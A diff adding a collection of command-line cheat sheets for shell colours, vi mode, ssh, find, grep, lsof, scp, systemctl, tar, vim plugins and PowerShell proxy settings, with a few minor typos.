+$(tput setaf 1)
+
+# Ansi tput method for Foreground Light Red
+
+$(tput setaf 9)
+
+# Ansi tput method for Foreground Light Green
+
+$(tput setaf 2)
+
+# Ansi tput method for Foreground Light Green
+
+$(tput setaf 10)
+
+# Ansi tput method for Foreground Yellow
+
+$(tput setaf 3)
+
+# Ansi tput method for Foreground Light Yellow
+
+$(tput setaf 11)
+
+# Ansi tput method for Foreground Blue
+
+$(tput setaf 4)
+
+# Ansi tput method for Foreground Light Blue
+
+$(tput setaf 12)
+
+# Ansi tput method for Foreground Magenta
+
+$(tput setaf 5)
+
+# Ansi tput method for Foreground Light Magenta
+
+$(tput setaf 13)
+
+# Ansi tput method for Foreground Cyan
+
+$(tput setaf 6)
+
+# Ansi tput method for Foreground Light Cyan
+
+$(tput setaf 14)
+
+# Ansi tput method for Foreground White
+
+$(tput setaf 7)
+
+# Ansi tput method for Foreground Light White
+
+$(tput setaf 15)
+
+
+# Ansi tput method for Background Black
+
+$(tput setab 0)
+
+# Ansi tput method for Background Light Black
+
+$(tput setab 8)
+
+# Ansi tput method for Background Red
+
+$(tput setab 1)
+
+# Ansi tput method for Background Light Red
+
+$(tput setab 9)
+
+# Ansi tput method for Background Light Green
+
+$(tput setab 2)
+
+# Ansi tput method for Background Light Green
+
+$(tput setab 10)
+
+# Ansi tput method for Background Yellow
+
+$(tput setab 3)
+
+# Ansi tput method for Background Light Yellow
+
+$(tput setab 11)
+
+# Ansi tput method for Background Blue
+
+$(tput setab 4)
+
+# Ansi tput method for Background Light Blue
+
+$(tput setab 12)
+
+# Ansi tput method for Background Magenta
+
+$(tput setab 5)
+
+# Ansi tput method for Background Light Magenta
+
+$(tput setab 13)
+
+# Ansi tput method for Background Cyan
+
+$(tput setab 6)
+
+# Ansi tput method for Background Light Cyan
+
+$(tput setab 14)
+
+# Ansi tput method for Background White
+
+$(tput setab 7)
+
+# Ansi tput method for Background Light White
+
+$(tput setab 15)
+
+# Set variable to the value of a unicode character
+
+circle_red_large=$'\U2B55'
+
+
+==> shell__vi-mode.cheat <==
+% shell, console, cli, vi mode, movements, cursor, text
+
+# Enable vi mode in Bash shell
+
+add the following to ~/.inputrc "set editing-mode vi"
+
+# Move to the start of the command line text
+
+^ OR I
+
+# Move to the end of the command line text
+
+$
+
+# Move one word forwards in the command line text
+
+w
+
+# Move one word segment backwards in the command line text
+
+b  (this takes 4 steps to move from the last 'e' to the first '-' in the following example " --backwards-move ")
+
+# Move one word boundary backwards in the command line text
+
+B  (this takes 1 step to move from the last 'e' to the first '-' in the following example " --backwards-move ")
+
+# Move to the end of the next word segment in the command line text
+
+e  (this takes 4 steps to move from the first '-' to the last 'e' in the following example " --forward-move ")
+
+# Move to the end of the next word boundary in the command line text
+
+E  (this takes 1 step to move from the first '-' to the last 'e' in the following example " --forward-move ")
+
+# Delete all text beginning at, and after the cursor 
+
+D
+
+# Undo the last change made to the command line text 
+
+u
+
+
+
+==> shm.txt <==
+
+==> ssh_1.cheat <==
+% ssh
+
+# 生成SSH秘钥对
+ssh-keygen -t rsa -C "<email>"
+
+==> ssh.cheat <==
+% ssh
+
+# login to a server and forward to ssh key (dangerous but usefull for bastion hosts)
+ssh -A <user>@<server>
+
+# login to a server with a key
+ssh -i <sshkey> <user>@<server>
+
+# login to a server with a port
+ssh -p <port> <user>@<server>
+
+# login to a server with a key and port
+ssh -i <sshkey> -p <port> <user>@<server>
+
+$ user : echo -e "$(whoami)\nroot"
+$ sshkey : find ~/.ssh | grep -v known_hosts | grep -v config
+$ server : cat /etc/hosts | cut -f2 -d' '
+==> text.cheat <==
+% text, encode, hex, base64
+
+# 16进制字符串转base64
+echo "<hex>" | xxd -r -p | base64
+
+==> utils__awk.cheat <==
+% awk
+
+# To sum integers from a file or stdin, one integer per line:
+printf '1\n2\n3\n' | awk '{ sum += $1} END {print sum}'
+
+# To use a specific character as separator to sum integers from a file or stdin:
+printf '1:2:3' | awk -F ":" '{print $1+$2+$3}'
+
+# To print a multiplication table:
+seq 9 | sed 'H;g' | awk -v RS='' '{for(i=1;i<=NF;i++)printf("%dx%d=%d%s", i, NR, i*NR, i==NR?"\n":"\t")}'
+
+# To specify an output separator character:
+printf '1 2 3' | awk 'BEGIN {OFS=":"}; {print $1,$2,$3}'
+
+# To execute commands only on rows that satisfy a certain condtion
+printf "george jetson\nolive oyl\nbeetle bailey" | awk '$2=="bailey"{print $0}'
+
+# To execute commands only on matching rows using regex
+printf "george jetson\nolive oyl\nbeetle bailey" | awk '/ley$/{print $0}'
+
+==> utils__disk.cheat <==
+% blkid, disk
+
+# Show available hard disk devices
+blkid
+
+# Available hard using a filter with the major device ID (comma separated list of numbers)
+lsblk --nodeps --noheadings --include <ids> --output NAME
+
+% lshw, disk
+
+# Show hard disk specifications and details
+lshw -class disk
+
+% hdparm, disk
+
+# Show information about SATA hard disks (using hdparm)
+hdparm -I /dev/<device>
+
+% nvme, disk
+
+# Show information about NVMe devices (using nvme)
+nvme list /dev/<device>
+==> utils__du.cheat <==
+% du, disk
+
+# Find the biggest directories on disk 
+du --all --human-readable --one-file-system <directory> | sort --human-numeric-sort --reverse | heada
+
+# Find when the last modification happened in a directory 
+du -sh --time <directory>
+==> utils__find.cheat <==
+% find
+
+# Find directories in location <dir>
+find <dir> -maxdepth 1 -type d
+
+# Find directories in location <dir> ignoring hidden directories
+find <directory> -maxdepth 1 -type d -not -path '*/.*' -not -path '.'
+
+# Prints all files that are descendants of your directory, skipping hidden files and directories
+find <directory> -not -path '*/.*'  -not -path '.'
+
+# Find files with some text in its name, but skip hidden files and directories
+find <directory> -not -path '*/.*' -type f -name '*<search text>*'
+
+# Find files with setuid (SUID)
+find <directory> -perm -4000
+
+# Find files with setuid (SUID)
+find <directory> -perm /u=s
+
+# Find files with setgid (SGID)
+find <directory> -perm -2000
+
+# Find files with setgid (SGID)
+find <directory> -perm /g=s
+
+# Searching for a directory with a specific name
+find <directory> -type d -name <name>
+
+# Find all empty directories under <directory>.
+find <directory>  -type d -empty
+
+# Find all the files owned by a specific user
+find <directory> -user <username>
+
+# Find all files owned by group
+find <directory> -group <group>
+
+# Find files smaller than x megabytes
+find <directory> -size -<x>M
+
+# Find files bigger than x megabytes
+find <directory> -size +<x>M
+
+# Find recently changed files - x minutes ago
+find <directory> -type f -mmin -<x>
+
+# Find files changed x weeks or later
+find <directory> -type f -mtime +<x>w
+
+# Looking for files that are changed after a specific date (yyyy-mm-dd)
+find <directory> -type f -newermt <date>
+
+# To find files modified in a specific date range (yyyy-mm-dd)
+find <directory> -type f -newermt <from> ! -newermt <to>
+
+# To find files accessed in a specific date range (yyyy-mm-dd)
+find <directory> -type f -newerat <from> ! -newerat <to>
+
+# Specify the depth to search
+find <directory> -maxdepth <depth> -print
+
+# Change all files that have file permissions of ^permissions_old' to more a sane value of ^permissions_new:
+find <directory> -type f -perm <permissions_old> -print -exec chmod <permissions_new> {} \;
+
+# Change all directories that have file permissions of ^permissions_old' to more a sane value of ^permissions_new:
+find <directory> -type d -perm <permissions_old> -print -exec chmod <permissions_new> {} \;
+
+# Find all writable files
+find <directory> -perm /222
+
+# Find writable files by others
+find <directory> -perm /002
+
+# Find writable files by others
+find <directory> -perm /g=w,o=w
+
+# Find symbolic links
+find <directory> -type l -xtype d
+
+==> utils__grep.cheat <==
+% grep
+
+# search a regular expression in a file
+grep <regex> <filename>
+
+# search a line which will start from only A-Z, a-z & 0-9 (Alphanumeric Characters).
+grep "^[[:alnum:]]"  <filename>
+
+# search line which will start from only [A-Z & a-z] i.e. Alpha Characters.
+grep "^[[:alpha:]]" <filename>
+
+# search line which will start from [Tab & Space] i.e. Blank Characters.
+grep "^[[:blank:]]" <filename>
+
+# search line which will start from digit [0-9] i.e. Digit Characters.
+grep "^[[:digit:]]" <filename>
+
+# search line which will start from lower letters i.e [a-z] (Lower Letters).
+grep "^[[:lower:]]" <filename>
+
+# search line which will start from [! " # $ % & ‘ ( ) * + , – . / : ; < = > ? @ [ \ ] ^ _ ` { | } ~. ] i.e. Punctuation Characters.
+grep "^[[:punct:]]" <filename>
+
+# search a line which will start from Alphanumeric & Punctuation Characters called as Graphical Characters.
+grep "^[[:graph:]]" tecmint.tx
+
+search a line which will start from Alphanumeric, Punctuation and space characters.
+grep "^[[:print:]]" <filename>
+
+# search a line which will start from [tab, newline, vertical tab, form feed, carriage return, and space] i.e. Space Characters.
+grep "^[[:space:]]" <filename>
+
+# search a line which will start from [A-Z] i.e Upper-case Letters.
+grep "^[[:upper:]]" <filename>
+
+# searches a line which will start from [0-9, A-F and a-f] i.e Hexadecimal Digits.
+grep "^[[:xdigit:]]" <filename>
+
+# Search a string in Gzipped Files
+zgrep -i <text> <filename>
+
+==> utils__head.cheat <==
+% head
+
+# To show the first 10 lines of <file>:
+head <file>
+
+# To show the first <number> lines of <file>:
+head -n <number> <file>
+
+# To show the first <number> bytes of <file>:
+head -c <number> <file>
+
+==> utils__ip.cheat <==
+% ip, network
+$ type: echo -e "vlan\nbridge"
+
+# Show ARP cache
+ip neighbour
+
+# Delete an ARP entry
+ip neigh del <ip> dev <device> 
+
+# Show assigned IP address of the system.
+ip address
+
+# Show assigned IP address of the system.
+ip address dev <device>
+
+# Limit the output by specifying its type, such as a bridge or VLAN.
+ip address show type <type>
+
+# List Multicast IP addresses
+ip maddr
+
+# Show network routing information
+ip route
+
+# Test routing for a specific IP address
+ip route get <ip>
+
+# Define a default route on the ens18 interface.
+ip route add default via <ip> dev <device>
+
+# Delete a route for the defined network
+ip route delete <gatewaypip> via <ip>
+==> utils__loginctl.cheat <==
+% loginctl, linux
+
+# Get session type
+loginctl show-session $(awk '/tty/ {print $1}' <(loginctl)) -p Type | awk -F= '{print $2}'
+==> utils__lsof.cheat <==
+% lsof
+
+# identify the used file size (in blocks) as per https://access.redhat.com/solutions/2316
+lsof -Fn -Fs |grep -B1 -i deleted | grep ^s  | cut -c 2- | awk '{s+=$1} END {print s}'
+
+# obtain a list of deleted files which are still held open by applications
+lsof | egrep "deleted|COMMAND"
+
+# force the system to de-allocate the space consumed by an in-use file by forcing the system to truncate the file via the proc file system. 
+echo > /proc/<pid>/fd/<fd_number>
+
+# Open files in a specific directory
+lsof +D <directory>
+
+# What files are open to a specific mount point
+lsof +f -- <mountpoint>
+
+# Query all open files on NFS
+lsof -N
+
+# Open files by process id (PID)
+lsof -p <pid>
+
+# Open files by process name
+lsof -c <processname>
+
+# Open files by user
+lsof -u <username>
+
+# All open files except of user <username>
+lsof -u ^<username>
+
+# Uncover deletet files
+lsof +L1
+
+# Open network connections (related sockets) by specifing multiple ports (comman sparated)
+lsof -i :<ports>
+
+# Open network connections (related sockets) by specifing protocols
+lsof -i UDP -i TCP
+
+# Show listening TCP services, limit the output. To avoid any lookups (hostname or service name), add -n and -P.
+lsof -n -P -i TCP -sTCP:Listen
+
+# Open connections for a single IP address can be specified as well, optionally with a port.
+lsof -n -P -i @<ip:port>
+==> utils__scp.cheat <==
+% scp
+
+# Copy a file from local to a remote host
+scp <source_file_name> <username>@<host>:<folder>
+
+# Copy a file from remote to local host
+scp <username>@<host>:<file> <target_folder>
+
+# Copy a file from local to a remote host while compressing
+scp -Cpv <source_file_name> <username>@<host>:<folder>
+
+# Copy a file from remote to local host while compressing
+scp -Cpv <username>@<host>:<file> <target_folder>
+
+# Change SCP Cipher to encrypt files
+$ cipher = echo "3des"
+scp -c <cipher> <source_file_name> <username>@<host>:<folder>
+
+# Limiting bandwidth usage
+scp -l <kbps> <source_file_name> <username>@<host>:<folder>
+
+# Use a different port for scp
+scp -P <port> <source_file_name> <username>@<host>:<folder>
+
+# Copy files and directories recursively
+scp -r <source_folder> <username>@<host>:<folder>
+
+# Disable progress messages
+scp -q <source_file_name> <username>@<host>:<folder>
+==> utils__sed.cheat <==
+% sed 
+
+# Remove trailing whitespace from a file 
+sed -i 's/[[:space:]]*$//' <file>
+
+# Insert a line at the beginning of a file 
+sed -i '1i <text>' <file>
+==> utils__system.cheat <==
+% process, linux
+
+# See the cgroup of a process
+cat /proc/$(pidof -s <process name>)&/cgroup
+
+# See cgroup in ps output
+ps -e -o pid,cgroup:64,args
+
+# Show the systemd machine ID 
+hostnamectl
+
+# KVM mount 9p virtio
+mount -t 9p -o trans=virtio,version=9p2000.L <hostshare> <mount_dir>
+==> utils__systemctl.cheat <==
+% systemctl, systemd
+$time: echo -e "target"
+
+# Stop running service
+systemctl stop <service>
+
+# Start service
+systemctl start <service>
+
+# Restart running service
+systemctl restart <service>
+
+# Reload config files for service
+systemctl reload <service>
+
+# Reload changed unit files
+systemctl daemon-reload
+
+# Show status of service
+systemctl status <service>
+
+# Show failed services (or --failed)
+systemctl state=failed
+
+# See all enabled services with systemctl 
+systemctl list-unit-files --type=service --state=enabled
+
+# Resets unit(s) with failed state
+systemctl reset-failed
+
+# Enable service or unit and allow start on boot
+systemctl enable <service>
+
+# Disable service or unit, don’t start at boot
+systemctl disable
+
+# Fully disable a unit
+systemctl mask
+
+# Reactivate unit again after being masked
+systemctl unmask
+
+# Show unit file details
+systemctl cat <service>
+
+# Show properties
+systemctl show <service>
+
+# See memory usage of a service with systemctl
+systemctl show --property=MemoryCurrent <service> | awk -F= '{print $2}'
+
+# Create configuration as drop in unit (extension to primary config)
+systemctl edit <service>
+
+# Edit primary unit file for service
+systemctl edit --full <service>
+
+# See only running services instead all active units
+systemctl --type=service --state=running --legend=false
+
+# See all masked units - systemd uses the concept of masked units that prevents those units from being started
+systemctl list-unit-files --state=masked
+
+# See all active systemd units of one type 
+systemctl list-units --type=<type>
+==> utils__tar.cheat <==
+% tar
+
+# Create a tar file for a directory <directory> in current directory
+tar -cvf <archive_file>.tar <directory>
+
+# Create a tar.gz file for a directory <directory> in current directory
+$ ext: echo "tar.gz tgz"
+tar -cvzf <archive_file>.<ext> <directory>
+
+# Create a tar.bz2 file for a directory <directory> in current directory
+$ ext: echo "tar.bz2 tbz tb2"
+tar -cvfj <archive_file>.<ext> <directory>
+
+# Untar files in current directory
+tar -xvf <archive_file>
+
+# Untar files in specified directory
+tar -xvf <archive_file>.tar -C <target_dir>
+
+# List files in tar/tgz/tbz archive
+tar -tvf <archive_file>
+
+# Extract specific file from tar archive
+tar -xvf <archive_file>.tar <file_to_extract>
+
+# Extract specific file from tgz archive
+$ ext: echo "tar.gz tgz"
+tar -zxvf <archive_file>.<ext> <file_to_extract>
+
+# Extract specific file from tbz archive
+$ ext: echo "tar.bz2 tbz tb2"
+tar -jxvf <archive_file>.<ext> <file_to_extract>
+
+# Extract specific file from tar archive using wildcards
+tar -xvf <archive_file>.tar --wildcards '<wildcard_expression>'
+
+# Extract specific file from tgz archive using wildcards
+$ ext: echo "tar.gz tgz"
+tar -zxvf <archive_file>.<ext> --wildcards '<wildcard_expression>'
+
+# Extract specific file from tbz archive using wildcards
+$ ext: echo "tar.bz2 tbz tb2"
+tar -jxvf <archive_file>.<ext> --wildcards '<wildcard_expression>'
+
+# Add files or directory to tar archive
+$ ext: echo "tar tar.gz tgz tar.bz2 tbz tb2"
+tar -rvf <archive_file>.tar <files_to_add>
+
+# Verify tar, tar.gz, and tar.bz2 archive file
+$ ext: echo "tar tar.gz tgz tar.bz2 tbz tb2"
+tar tvfW <archive_file>.<ext>
+
+# Check tar file size
+$ ext: echo "tar tar.gz tgz tar.bz2 tbz tb2"
+tar -czf <archive_file>.<ext> | wc -c
+
+# Remove file and directory from tar file
+$ ext: echo "tar tar.gz tgz tar.bz2 tbz tb2"
+tar --delete -f <archive_file>.<ext> <files_to_exclude>
+==> utils__time.cheat <==
+% time
+
+# See the time synchronization details with timedatectl 
+timedatectl timesync-status
+==> utils__wc.cheat <==
+% wc
+
+# Count number of lines, number of words and number of bytes in a file
+wc <filename>
+
+# Count number of lines in a file
+wc -l <filename>
+
+# Count number of words in a file
+wc -w <filename>
+
+# Count number of characters in a file
+wc -m <filename>
+
+# Count number of bytes in a file
+wc -c <filename>
+
+# Display Length of Longest Line in File
+wc -L <filename>
+
+==> vim__easymotion.cheat <==
+% vim-easymotion, easymotion, plugins, neovim, vim, vi
+
+# Trigger word motion
+
+<leader><leader>w
+
+# Move cursor to one space before the specific letter
+
+<leader><leader>t<char>
+
+# Move cursor to one space after the specific letter (backwards)
+
+<leader><leader>T<char>
+
+# word motion and search for a specific letter
+
+<leader><leader>f<char>	uses the 'f' motion
+
+# word motion and search for a specific letter (backwards)
+
+<leader><leader>F<char>	uses the 'F' motion
+
+
+==> vim__folding.cheat <==
+% folding, code, text, vi, vim, neovim
+
+# Reduces fold level throughout the buffer
+
+zr 
+
+# Opens all folds
+
+zR 
+
+# Increases fold level throughout the buffer
+
+zm 
+
+# Fold everything all the way
+
+M 
+
+# Open the fold your cursor is on
+
+za 
+
+# Open the fold your cursor is on recursively
+
+zA 
+
+# Close the fold your cursor is on
+
+zc 
+
+# Close the fold your cursor is on recursively
+
+zC 
+
+
+
+==> vim__formatting.cheat <==
+% formatting, code, text, pretty, neovim, vim, vi
+
+# Format text object for outermost JSON object
+
+aj
+
+# Format text object for innermost JSON object
+
+ij
+
+# Format (pretty print) JSON under the cursor
+
+gqaj
+
+==> vim__markdown.cheat <==
+% markdown, navigation, text, neovim, vim, vi
+
+# Open linked file under cursor in vim 
+
+ge
+
+# Open linked url under cursor in browser
+
+gx
+
+# Goto current header
+
+c
+
+# Goto parent header
+
+u
+
+# Goto next header
+
+]]
+
+# Goto previous header
+
+[[
+
+# Goto next sibling header, if any
+
+][
+
+# Goto previous sibling header, if any
+
+[]
+
+==> vim__movements.cheat <==
+% movement, navigation, vi, vim, neovim
+
+# Move cursor forward to the end of the next word segment
+
+b OR <num>b  (Requires 5b to jump across the following " merry-go-round ")
+
+# Move cursor forward to the end of the next word boundary
+
+B OR <num>B  (Requires B (1 step) to jump across the following " merry-go-round ")
+
+# Move cursor to Nth occurrence of {char} 
+# Move cursor forward to the end of the next word segment
+
+e OR <num>e  (Requires 5e to jump across the following " merry-go-round ")
+
+# Move cursor forward to the end of the next word boundary
+
+E OR <num>E  (Requires E (1 step) to jump across the following " merry-go-round ")
+
+# Move cursor to Nth occurrence of {char} 
+
+f<char> OR <num>f<char>
+
+# Move cursor before Nth occurrence of {char} to the right
+
+t<char> OR <num>f<char>
+
+# Move cursor N paragraphs backward
+
+{ OR <num>{
+
+# Move cursor N Paragraphs forward
+
+} OR <num>}
+
+# Move cursor to column first column on the current line
+
+| OR ^
+
+# Move cursor to column Nth column on the current line
+
+<num>|
+
+==> vim__multi-cursor.cheat <==
+% multi-cursor, multi, cursors, neovim, vim, vi
+
+# Begin selection. repeat to add
+
+<ctrl>n
+
+# Create cursors
+
+<ctrl>Up OR <ctrl>Down
+
+# Jump to next/previous occurrence
+
+n OR N 
+
+# Select next/previous cursor
+
+[ OR ]
+
+# Skip and get next occurrence
+
+q
+
+# Remove current cursor
+
+Q
+
+# Switch to `extend` mode
+
+<tab>
+
+
+==> vim__navigation.cheat <==
+% page, navigation, vi, vim, neovim
+
+# Move cursor to the top of the page
+
+H
+
+# Move cursor to the middle of the page
+
+M
+
+# Move cursor to the bottom of the page
+
+L
+
+
+==> vim__nerd-commenter.cheat <==
+% nerd-commenter, comments, code, text, vi, vim, neovim
+
+# Toggle comment (modes: normal, visual) (preservim/nerdcommenter) 
+<leader>c<space>
+
+# Comment out the current line or text selected in visual mode. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cc |NERDCommenterComment|
+
+# Same as cc but forces nesting. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cn |NERDCommenterNested|
+
+# Toggles the comment state of the selected line(s). If the topmost selected line is commented, all selected lines are unco# mmented and vice versa. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>c<space> |NERDCommenterToggle|
+
+# Comments the given lines using only one set of multipart delimiters. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cm |NERDCommenterMinimal|
+
+# Toggles the comment state of the selected line(s) individually. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>ci |NERDCommenterInvert|
+
+# Comments out the selected lines with a pretty block formatted layout. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cs |NERDCommenterSexy|
+
+# Same as cc except that the commented line(s) are yanked first. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cy |NERDCommenterYank|
+
+# Comments the current line from the cursor to the end of line. (modes: normal, visual) (preservim/nerdcommenter)
+<leader>c$ |NERDCommenterToEOL|
+
+# Adds comment delimiters to the end of line and goes into insert mode between them. (modes: normal, visual) (preservim/nerdcommenter)
+<leader>cA |NERDCommenterAppend|
+
+# Switches to the alternative set of delimiters (modes: normal, visual) (preservim/nerdcommenter)
+<leader>ca |NERDCommenterAltDelims|
+
+# or both sides (<lea# der>cb). (modes: normal, visual) (preservim/nerdcommenter)
+<leader>cl 
+
+# Comment out (and align left) the current line or text selected in visual mode. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cl |NERDCommenterAlignLeft 
+
+# Comment out (and align left) the current line or text selected in visual mode. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cb |NERDCommenterAlignBoth
+
+# Uncomment current line or text selected in visual mode. (modes: normal, visual) (preservim/nerdcommenter)
+[count]<leader>cu |NERDCommenterUncomment|
+
+
+==> vim__sorting.cheat <==
+% sorting, text, neovim, vim, vi
+
+# Sort lines beginning at cursor "go sort"
+
+gs
+
+# Sort "2" lines down "j" beginning at cursor "go sort"
+
+gs2j
+
+# Sort lines/text inside "i" parens "("
+
+gsi(
+
+# Sort lines inside "i" paragraph "p"
+
+gsip
+
+==> vim__splits.cheat <==
+
+# Open new horizontal split
+
+:sp <file>
+
+# Open new vertical split
+
+:vsp <file>
+
+# Move between open split buffers
+
+<ctrl>w [hjkl]
+
+# Resize current horizontal split
+
+:resize <num> OR :res <num>
+
+# Resize current horizontal split by a relative amount
+
+:res +<num> OR :res -<num> (num can be + or -)
+
+# Resize current vertical split
+
+:vertical resize <num> OR :vertical res <num>
+
+# Resize current vertical split by a relative amount
+
+:vertical res +<num> OR :vertical res -<num>
+
+# Resize current horizontal split by one line
+
+<ctrl>w + OR <ctrl>w -
+
+# Resize current horizontal split by <num> lines
+
+<ctrl>w <num> + OR <ctrl>w <num> -
+
+# Resize current vertical split by one line
+
+<ctrl>w > OR <ctrl>w <
+
+# Resize current vertical split by <num> lines
+
+<ctrl>w <num> > OR <ctrl>w <num> <
+
+# Resize all windows to equal dimensions
+
+<ctrl>w =
+
+# Resize a window to maximum height
+
+<ctrl>w _
+
+# Resize a window to maximum width
+
+<ctrl>w |
+
+
+==> vim__surround.cheat <==
+% vim-surround, surround, wrap, text, neovim, vim, vi
+
+# Surround text under cursor with double-quote
+
+ysiw<char>	example -> ysiw" -> "example"
+
+# Surround text under cursor with single-quote
+
+ysiw<char>	example -> ysiw' -> 'example' 
+
+# Surround text under cursor with html/xml brackets
+
+ysiw<p>	example -> <p>example</q>
+
+# Surround text under cursor with other text
+ysiw*	example -> *example*
+
+# Change surrounding delimiters
+
+cs<char><char> 'example' cs'" -> "example"
+
+# Delete surrounding delimiters
+
+ds<char>	"example" -> ds" -> example
+
+# Surround text under cursor with () [] or {} without space or padding
+
+ysiw(	example -> (example)
+
+# Surround text under cursor with () [] or {} with space or padding
+
+ysiw)	example -> ( example )
+
+# Change surrounding () [] or {} to include space
+
+cs)(	(example) -> ( example )
+
+# Change surrounding () [] or {} to include space and change delimiter
+
+cs]{	[example] -> { example }
+
+# Surround the entire current line under cursor with parens () without space or padding
+
+yssb OR yss)	example line -> (example line)
+
+# Surround the entire current line under cursor with parens () with space or padding
+
+yss<space>b OR yss(	example line -> (example line)
+
+# Surround the entire current line under cursor with curly braces {} without space or padding
+
+yssB OR yss}	example line -> (example line)
+
+# Surround the entire current line under cursor with curly braces {} with space or padding
+
+yss<space>B OR yss{	example line -> { example line }
+
+
+==> vim__tabs.cheat <==
+% tabs, workspace, buffers, window, neovim, vim, vi
+
+# Open file in a new tab
+
+:tabnew <file>
+
+# Go to the next tab
+
+:tabn OR :tabnext
+
+# Go to the previous tab
+
+:tabp OR :tabprevious
+
+# Close all other tabs
+
+:tabo OR :tabonly
+
+
+==> vim__visual-mode.cheat <==
+% visual, visual-mode, neovim, vim, vi
+
+# surround visual selection with []
+
+v$jS]
+
+# Select from cursor up to end of current paragraph 
+
+v}
+
+# Select from cursor up to end of current paragraph 
+
+v)
+
+# Select from cursor back to start of previous paragraph 
+
+v{
+
+# Select from cursor back to start of current paragraph 
+
+v(
+
+# Select current line | select current to N lines
+
+V*
+
+# Select text inside parens ()
+
+vib or vi)
+
+# Delete text inside parens ()
+
+dib or di)
+
+# Change text inside parens ()
+
+cib or ci)
+
+# Extend highlighted area with a () block
+
+ab
+
+# Extend highlighted area with a paragraph
+
+ap
+
+# Extend highlighted area with a sentence
+
+as
+
+# Extend highlighted area with a tag block
+
+at
+
+# Extend highlighted area with 'a word'
+
+aw
+
+# Format the highlighted lines
+
+gq
+
+# Extend highlighted area with inner () block
+
+ib
+
+# Extend highlighted area with inner paragraph
+
+ip
+
+# Extend highlighted area with inner sentence
+
+is
+
+# Extend highlighted area with inner tag block
+
+it
+
+# Extend highlighted area with 'inner word'
+
+iw
+
+# Select a <> block
+
+a<
+
+# Select a single-quoted string
+
+a'
+
+# Select a double-quoted string
+
+a"
+
+==> windows__windows.cheat <==
+% windows, powershell
+
+# to list all the features available with a given string
+Get-WindowsFeature | Where-Object Name -like '*<search_string>*' | Select-Object 
+
+# remove feature from windows
+Remove-WindowsFeature <feature_name>
+
+% proxy
+@ windows, powershell
+
+# Use a proxy that isn't already configured in Internet Options
+[net.webrequest]::defaultwebproxy = new-object net.webproxy "http://proxy.example.org:8080"
+
+# Use the Windows credentials of the logged-in user to authenticate with your proxy
+[net.webrequest]::defaultwebproxy.credentials = [net.credentialcache]::defaultcredentials
+
+# Use other credentials (replace 'username' and 'password')
+[net.webrequest]::defaultwebproxy.credentials = new-object net.networkcredential 'username', 'password'
+
+==> zip.cheat <==
+%zip, file
+
+# 将文件压缩成几个小文件
+zip - <input_zip> | split -b 500k -a 3 - <output_zip>
